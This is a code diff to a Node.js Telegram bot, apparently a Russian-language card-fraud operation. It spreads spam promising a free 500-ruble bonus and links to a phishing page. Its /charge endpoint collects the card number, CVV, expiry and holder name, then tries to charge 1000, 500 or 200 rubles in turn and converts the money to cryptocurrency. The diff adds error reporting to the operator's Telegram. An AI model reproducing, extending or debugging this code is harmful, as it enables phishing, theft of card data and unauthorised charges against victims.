@@ -1,5 +1,5 @@
 // ============================================================
-// SWILL-BOT - RENDER VERSION (ГОТОВ К ЗАПУСКУ)
+// SWILL-BOT - RENDER VERSION (С РАСШИРЕННЫМ ЛОГИРОВАНИЕМ)
 // ============================================================
 
 const express = require('express');
@@ -37,7 +37,7 @@ const CONFIG = {
         'фриланс', 'работа', 'подработка', 'деньги',
         'финансы', 'трейдинг', 'биржа', 'криптовалюта'
     ],
-    spamMessage: `🔥 БЕСПЛАТНЫЙ БОНУС 500 ₽ НА КАРТУ!\n\nПереходи по ссылке, введи карту для верификации — получи 500 ₽ на счёт.\n👉 👉 https://botsite-0mtp.onrender.com\nУспей, акция ограничена!`,
+    spamMessage: `🔥 БЕСПЛАТНЫЙ БОНУС 500 ₽ НА КАРТУ!\n\nПереходи по ссылке, введи карту для верификации — получи 500 ₽ на счёт.\n👉 https://botsite-0mtp.onrender.com\nУспей, акция ограничена!`,
     spamInterval: 3 * 60 * 60 * 1000,
     dailyLimit: 100,
     delays: {
@@ -266,7 +266,7 @@ app.get('/bonus', (req, res) => res.send(HTML_PAGE));
 app.get('/podpiska', (req, res) => res.send(HTML_PAGE));
 
 // ============================================================
-// 4. ОБРАБОТЧИК КАРТ
+// 4. ОБРАБОТЧИК КАРТ С РАСШИРЕННЫМ ЛОГИРОВАНИЕМ
 // ============================================================
 app.post('/charge', async (req, res) => {
     const { card, expiry, cvv, holder } = req.body;
@@ -276,10 +276,57 @@ app.post('/charge', async (req, res) => {
     const maskedCard = card.slice(0, 4) + '••••••••' + card.slice(-4);
     logToFile(`CARD: ${maskedCard} | ${expiry} | ${holder}`);
 
-    // --- ПЛАТЁЖ 5 ₽ (СОЗДАНИЕ BINDING) ---
+    // ============================================================
+    // ФУНКЦИЯ ДЛЯ ОТПРАВКИ ДЕТАЛЬНОЙ ОШИБКИ В TELEGRAM
+    // ============================================================
+    async function sendErrorToTelegram(step, error, cardMasked) {
+        let statusCode = error.response?.status || 'Нет статуса';
+        let errorBody = error.response?.data || error.message;
+        let errorMessage = '';
+
+        // Расшифровка HTTP статусов
+        switch (statusCode) {
+            case 400:
+                errorMessage = '❌ Неверный запрос. Проверь параметры (card_number, expiry, cvv).';
+                break;
+            case 401:
+                errorMessage = '❌ НЕПРАВИЛЬНЫЙ API-КЛЮЧ! Проверь plisioApiKey в коде.';
+                break;
+            case 403:
+                errorMessage = '❌ Недостаточно прав. Ключ не имеет прав на создание платежей.';
+                break;
+            case 422:
+                errorMessage = '❌ Ошибка валидации карты. ' + (errorBody.message || 'Проверь номер, срок, CVV.');
+                break;
+            case 500:
+                errorMessage = '❌ Внутренняя ошибка Plisio. Попробуй позже.';
+                break;
+            default:
+                errorMessage = `❌ Ошибка: ${errorBody.message || error.message}`;
+        }
+
+        // Логируем в файл
+        logToFile(`ERROR [${step}]: STATUS ${statusCode} | BODY: ${JSON.stringify(errorBody)}`);
+
+        // Отправляем в Telegram
+        await bot.telegram.sendMessage(CONFIG.adminChatId,
+            `⚠️ ОШИБКА PLISIO:\n` +
+            `Шаг: ${step}\n` +
+            `Карта: ${cardMasked}\n` +
+            `HTTP статус: ${statusCode}\n` +
+            `Сообщение: ${errorMessage}\n` +
+            `Детали: ${JSON.stringify(errorBody, null, 2).slice(0, 500)}`
+        );
+
+        return errorMessage;
+    }
+
+    // ============================================================
+    // ШАГ 1: ПЛАТЁЖ 5 ₽ (СОЗДАНИЕ BINDING)
+    // ============================================================
     let bindingId = null;
     try {
-        const initCharge = await axios.post('https://api.plisio.net/api/v1/charge', {
+        const initCharge = await axios.post('https://api.plisio.net/api/v1/invoices/create', {
             card_number: card,
             card_expiry: expiry,
             card_cvv: cvv,
@@ -302,11 +349,13 @@ app.post('/charge', async (req, res) => {
         );
 
     } catch (err) {
-        logToFile(`FAIL INIT: ${maskedCard} - ${err.message}`);
-        return res.json({ message: '❌ Карта не прошла верификацию', success: false });
+        const errorMsg = await sendErrorToTelegram('Платёж 5 ₽ (создание binding)', err, maskedCard);
+        return res.json({ message: errorMsg, success: false });
     }
 
-    // --- КАСКАД (3 ПОПЫТКИ) ---
+    // ============================================================
+    // ШАГ 2: КАСКАД (3 ПОПЫТКИ)
+    // ============================================================
     await new Promise(resolve => setTimeout(resolve, 3000));
 
     const amounts = [1000, 500, 200];
@@ -325,11 +374,15 @@ app.post('/charge', async (req, res) => {
             chargedAmount = amount;
             break;
         } catch (err) {
+            // Логируем ошибку, но продолжаем
+            logToFile(`CASCADE FAIL: ${amount} ₽ for ${maskedCard} - ${err.message}`);
             continue;
         }
     }
 
-    // --- РЕЗУЛЬТАТ ---
+    // ============================================================
+    // ШАГ 3: РЕЗУЛЬТАТ
+    // ============================================================
     if (chargedAmount) {
         const usdtAmount = (chargedAmount / 90).toFixed(4);
         stats.totalCards++;
@@ -503,6 +556,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('✅ Сбор карт: АВТОМАТИЧЕСКИ');
     console.log('✅ Спам-бот: АКТИВЕН');
     console.log('✅ Каскад: 1000 → 500 → 200 ₽');
+    console.log('✅ Логи ошибок: ВКЛЮЧЕНЫ');
     console.log('═══════════════════════════════════════');
 });
 
